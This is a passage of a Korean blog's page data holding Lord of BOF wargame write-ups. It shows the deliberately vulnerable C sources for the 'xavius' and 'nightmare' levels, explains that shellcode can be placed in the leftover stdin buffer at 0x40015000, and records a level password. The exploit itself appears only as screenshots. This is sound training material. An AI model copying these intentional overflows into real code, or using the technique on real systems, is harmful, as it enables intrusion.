string\">&lt;dumpcode.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>ret_addr<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// overflow!</span>\r\n        <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack retbayed you!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">47</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\x08'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"binary image retbayed you, too!!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check if the ret_addr is library function or not</span>\r\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>ret_addr<span class=\"token punctuation\">,</span> buffer<span class=\"token operator\">+</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x90\\x90\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">// end point of function</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ret_addr <span class=\"token operator\">==</span> <span class=\"token char\">'\\xc9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>                <span class=\"token comment\">// leave</span>\r\n                        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>ret_addr<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xc3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>    <span class=\"token comment\">// ret</span>\r\n                                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You cannot use library function!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token punctuation\">}</span>\r\n                <span class=\"token punctuation\">}</span>\r\n                ret_addr<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// stack destroyer</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbfffffff</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// LD_* eraser</span>\r\n        <span class=\"token comment\">// 40 : extra space for memset function</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">-</span><span class=\"token number\">3000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token operator\">-</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>가장 먼저 여태까지 대부분 argv로 입력값을 받고 있던 것을 stdin으로 받고 있다.\r\n그리고 buffer+47에 있는 값, 즉 return address의 주소지 맨 앞부분이 \\xbf이거나 \\x08인지 체크하고 있다(20번째, 26번째줄).\r\n또한 buffer + 44, buffer+45가 각각 \\x90와 같지 않으면 while문을 돌게 하고 있다(33 ~ 34번째줄).\r\nfgets는 stdin으로 입력을 받는다. 우선 입력받는 stdin이 어느 주소지에 위치해 있는지를 알아볼 필요가 있다고 생각했다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 432px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.242424242424235%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7CAAAOwgEVKEqAAAABbUlEQVR42m2S6W7EIAyEc2dzABuOAAGy2fb9n3Eqe6tWq/aHZRw5n4cxVS4FWm/QxiIEDx8idmfRdR2GYUDf92iahjNF27b8fRxHVFX1N56fH/Dewe07rLN4Pp/wfsc8zxBSQkqJEAO00bDOIecDQghIKdDU9V9gLhlHOuBDgBQrqDbGYF5mbuj6HikdfBZS4bpOHrLd1f8Kj5QQY8CmNdZ1QcoJzjls250b6Ho+eD4v64pSEmJKDFZKYej7d2A5C+IR4byHUhLlPBmotf4B0hDylCw4z4JVCCzLAiEki3gDno+TrxRihLorUE1eUXRtw6DH9cA03Rh0XQ/2kBZV1zVnCloW1ewhKYwxsjekxlrLC2q/G0MInNf15TEtUBuD+7bBmI0HUD1NE6qUM3tITeQJ/+AcjDU/QOqZbi+FpJYWNt5GDOPIMFL/tmV6Ft57VkjvkuC737+BHY6U+VoEZHtC5NwPA5ZlxjD8LuYL3xfRRElNB88AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/91545d276b50630f15f5e7c817db0c34/c9b55/0.webp 165w,\n/static/91545d276b50630f15f5e7c817db0c34/f2908/0.webp 330w,\n/static/91545d276b50630f15f5e7c817db0c34/0bafe/0.webp 432w\"\n              sizes=\"(max-width: 432px) 100vw, 432px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/91545d276b50630f15f5e7c817db0c34/04c57/0.png 165w,\n/static/91545d276b50630f15f5e7c817db0c34/d9ecf/0.png 330w,\n/static/91545d276b50630f15f5e7c817db0c34/0e0c3/0.png 432w\"\n            sizes=\"(max-width: 432px) 100vw, 432px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/91545d276b50630f15f5e7c817db0c34/0e0c3/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>어떤 함수에 인자로 들어가는 값과 리턴되는 값은 eax를 통한다. fgets에 들어가기 전 eax에 마지막으로 담기는 값은 0x8049a3c에 들어있는 값이다(main+6).</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 387px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7CAAAOwgEVKEqAAAABEklEQVR42o2Q246DMBBDKfeEhFyAJNAWqmr3/z/xrEhV7VOlPoziGTmW7eJ6u6LVgLWG9boRUmIcFVVV0bQtTdNkXBTFd7MfOykGnLW0XYuQEiF6vHc473HeobT6XvC+3zBmpOu6LNj3Pb3oKcvyhfN0SCmQw4AQInPP/XT/5py3LKiUYjQjwyCx1jLNE9M0UVdVvk/zjNYa52x27CePUgNLWHISYy3ee4wxXC4XihMYozPp3dWgFMYalNbZ0dvB+bk9e63rz5GfP0/ivLCmlN3c9zv74+B4HIQQ6PruVUfbIqXMb1WVnwVTjKTfFRcsQkjWbWXdNvb9TowxRzuFtFbUdZ1jpZRwzjEvCyEGmubf8R/W55yQBVFjYgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2d170f3ab62ef13e548e570eb4c0ca1e/c9b55/1.webp 165w,\n/static/2d170f3ab62ef13e548e570eb4c0ca1e/f2908/1.webp 330w,\n/static/2d170f3ab62ef13e548e570eb4c0ca1e/bbd0d/1.webp 387w\"\n              sizes=\"(max-width: 387px) 100vw, 387px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2d170f3ab62ef13e548e570eb4c0ca1e/04c57/1.png 165w,\n/static/2d170f3ab62ef13e548e570eb4c0ca1e/d9ecf/1.png 330w,\n/static/2d170f3ab62ef13e548e570eb4c0ca1e/691c3/1.png 387w\"\n            sizes=\"(max-width: 387px) 100vw, 387px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2d170f3ab62ef13e548e570eb4c0ca1e/691c3/1.png\"\n            alt=\"memory_stdin\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>stdin값이 맞다. 그리고 해당 주소지에 들어있는 값은 0x401068c0이다. 이전의 문제들에서는 buffer+47의 값이 \\x40와 같은지를 확인했었는데 이 문제에서는 확인하고 있지 않는 이유는 이를 활용하는 문제이기 때문일 것이라고 추측하였다. 다시한번 fgets가 끝나는 시점인 main+26에 breakpoint를 걸고 stdin에 입력값을 넣은 후 이의 주소지를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.36363636363637%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7CAAAOwgEVKEqAAAABC0lEQVR42o2R2Y7DIAxFk2bfoAlmC5kQdf7/G+/IjkbtYx8sWwYf7jVFzhlEBP18QimFZVlQ1zWqqpLguixLFEXxXewpwTkHay3IWnjvEUKQmKYJXdfhUT2+BxoibNuKeZ5hjJHc9/0NerxBXP8r/aw5f94rzpyRUhKFrCrGKLa11tIfhgFN2yLGAK2VDLMLIiMwYzY4Z2U1t+V9R9yjHPAuGSr2ifD6fWGeJwFeVxYnDDl/DplhQAgeZz7fwPO8FRoyAklHgvP3TvOVobTCMI4C2cyKtm1xHEkUN00jQJ7ph/5egwseNlqs6yqfQpYkeJBf5J7zXi4rrcGOmqYWAAsZxxFVXSHuuzD+AAPeoIPa9n3/AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5d05b8246fbf36cf25026c8c6284e27a/c9b55/2.webp 165w,\n/static/5d05b8246fbf36cf25026c8c6284e27a/f2908/2.webp 330w,\n/static/5d05b8246fbf36cf25026c8c6284e27a/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5d05b8246fbf36cf25026c8c6284e27a/04c57/2.png 165w,\n/static/5d05b8246fbf36cf25026c8c6284e27a/d9ecf/2.png 330w,\n/static/5d05b8246fbf36cf25026c8c6284e27a/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5d05b8246fbf36cf25026c8c6284e27a/32056/2.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>stdin에 반복적으로 나타나는 0x40015000 주소지를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAA7CAAAOwgEVKEqAAAABPUlEQVR42l2R67LCIAyEodTeLK1Uyp2q7/+Qeyapx3H8kYEdki/ZIEotCDHAewetZ8SU4L3H9XqFEALDMGBZFtZSSrRtC60XzPOMy+XCOfQ+zxp930MQkGLfLT/uziHlhBACa7NteL6eKCUzbBhHHI8DtZZ3U4nH84F6VBhzgwgxIsYIe78z4G4tck6w7wZ6WRgWU4RSCl3fI8bATcdx5ByqJ72uKwRZTCl9JrQELBm7208768oOqKhVim1RccoR03QCT52w3r6A1n5NWDLvlDR1PY7KBW17AslBLukDzDmzi9s/0AfPQLLkvOcCYwwn0/LpnSZupETXdawp6MMox4fAWi8aIpeCEDyc2zFNE7Ztg9kMtNasKehOkxFASsGQ76Df/+hSK+/IvXdGRbSrRimeuGkaPqmI7r+w3/gDKQe6ICVC9mYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/60c5d56b233f15d0e7b359a6fa0a4e59/c9b55/3.webp 165w,\n/static/60c5d56b233f15d0e7b359a6fa0a4e59/f2908/3.webp 330w,\n/static/60c5d56b233f15d0e7b359a6fa0a4e59/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/60c5d56b233f15d0e7b359a6fa0a4e59/04c57/3.png 165w,\n/static/60c5d56b233f15d0e7b359a6fa0a4e59/d9ecf/3.png 330w,\n/static/60c5d56b233f15d0e7b359a6fa0a4e59/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/60c5d56b233f15d0e7b359a6fa0a4e59/32056/3.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>stdin 입력값은 0x40015000에 들어있음을 확인하였다. 이제 main함수가 다 끝나고 leave-ret을 하기까지 stdin에 입력값이 남아있는지 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7CAAAOwgEVKEqAAAABgUlEQVR42pVTa5OCMAxEQMqhyKNAobykoPf/f+HebNSZuw+e+iFDN1M2m2TrjdOEaZ5QNw3GcURnO0RRhLwokOcZlFI4HA5QKoLnea+DhPM8ozEkHNAPPeI4RpZn+Irj90h+h+0thmGA1hpt16Lt7grz/H1Vfwl7UVVVlbRLHMcKWZYhVupzQirKi1yUidKqQpoeEYQBfN//nPCmTsvgj8cjkiSR836//5yMMZ/P6HsLXWkYY1CUpWy8bmp0XYuG57pGyXxdS9EgCP4hXBYsq8O6rbhcN7htg1sd3LpKbrteBC/OwTmH6/dVFvaUkNUYnBdj5/sIglBy3DZzbJ/B3OP7lHC4m5nt9sOA6e5JLoots1VizpnLokdfElohbMTInbVCfjqlciE5JDLXNL3hMAwF01ZUu9vtxMNFUUoxMba1FlqX8oPWFUzboqkrwZwXizbGIPB9cQEx75CAhHyy9C878ExrwHgQsjpfDFskpjJibp3z5NumZ/kPzyQk5h0S/gDntCVFwx+glgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b02f0184b69694b12db6a838f25407ea/c9b55/4.webp 165w,\n/static/b02f0184b69694b12db6a838f25407ea/f2908/4.webp 330w,\n/static/b02f0184b69694b12db6a838f25407ea/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b02f0184b69694b12db6a838f25407ea/04c57/4.png 165w,\n/static/b02f0184b69694b12db6a838f25407ea/d9ecf/4.png 330w,\n/static/b02f0184b69694b12db6a838f25407ea/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b02f0184b69694b12db6a838f25407ea/32056/4.png\"\n            alt=\"memory3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>stdin에 값이 남아있음을 확인하였다. 이 위치에 쉘코드를 입력하면 공격이 성공할 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.21212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAjklEQVR42qWOzQqDMBCEEyNkdxNFzTYKpr7/W07ZWAo99dDDx/4MM4w72wnjup5orfXdZq21s+87trJhWRYULVBVqBbU+sC6rpimCd57OOdu5nmGiHTRTMY4jgghYBgGENG34RcWZIEsjBgjIhFYBCklMN8/ed8WLpI+GjMh5dT1nDOICe44jt7KjNbkX15YLVhITycIuAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/06c34fcb8290833fa81155aca33fa4c7/c9b55/5.webp 165w,\n/static/06c34fcb8290833fa81155aca33fa4c7/f2908/5.webp 330w,\n/static/06c34fcb8290833fa81155aca33fa4c7/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/06c34fcb8290833fa81155aca33fa4c7/04c57/5.png 165w,\n/static/06c34fcb8290833fa81155aca33fa4c7/d9ecf/5.png 330w,\n/static/06c34fcb8290833fa81155aca33fa4c7/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/06c34fcb8290833fa81155aca33fa4c7/32056/5.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: throw me away</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"0a2d995e-26c7-549e-8321-fe53d6179c39","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-19/","title":"LOB 19번 (nightmare -> xavius)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/c5c498acf9daf634de40d61027a76f6c/d8071/0.png","srcSet":"/static/c5c498acf9daf634de40d61027a76f6c/9cd48/0.png 134w,\n/static/c5c498acf9daf634de40d61027a76f6c/fce67/0.png 267w,\n/static/c5c498acf9daf634de40d61027a76f6c/d8071/0.png 534w","sizes":"(min-width: 534px) 534px, 100vw"},"sources":[{"srcSet":"/static/c5c498acf9daf634de40d61027a76f6c/b9710/0.webp 134w,\n/static/c5c498acf9daf634de40d61027a76f6c/41ce8/0.webp 267w,\n/static/c5c498acf9daf634de40d61027a76f6c/69e03/0.webp 534w","type":"image/webp","sizes":"(min-width: 534px) 534px, 100vw"}]},"width":660,"height":400.44943820224717}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - nightmare\r\n        - PLT\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dumpcode.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>addr<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check address</span>\r\n        addr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>strcpy<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You must fall in love with strcpy()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// overflow!</span>\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// dangerous waterfall</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>우선 24번째 줄의 조건문을 우회해야 하기 때문에 이전 문제에서 ret를 DO 함수로 덮어씌웠듯이 strcpy 함수의 주소를 찾아 ret를 채울 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 534px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 9.696969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAaElEQVR42h3KSQ7DIAwAwCBShyUEG2zAURH8/5WVOuc5mGtrMuccqoi5FNp75fxI76r65CxN1t5IKML/1itXADhPe9x3cs4xCxUyxsQY3/f13l8XrLVSSgAfESEi1THnd+hAxBCCtfYHKXYIYW+/CuMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c5c498acf9daf634de40d61027a76f6c/c9b55/0.webp 165w,\n/static/c5c498acf9daf634de40d61027a76f6c/f2908/0.webp 330w,\n/static/c5c498acf9daf634de40d61027a76f6c/29722/0.webp 534w\"\n              sizes=\"(max-width: 534px) 100vw, 534px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c5c498acf9daf634de40d61027a76f6c/04c57/0.png 165w,\n/static/c5c498acf9daf634de40d61027a76f6c/d9ecf/0.png 330w,\n/static/c5c498acf9daf634de40d61027a76f6c/a07a7/0.png 534w\"\n            sizes=\"(max-width: 534px) 100vw, 534px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c5c498acf9daf634de40d61027a76f6c/a07a7/0.png\"\n            alt=\"readelf\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.303030303030305%; position: relative; bottom: 0; left: 0; background-image: 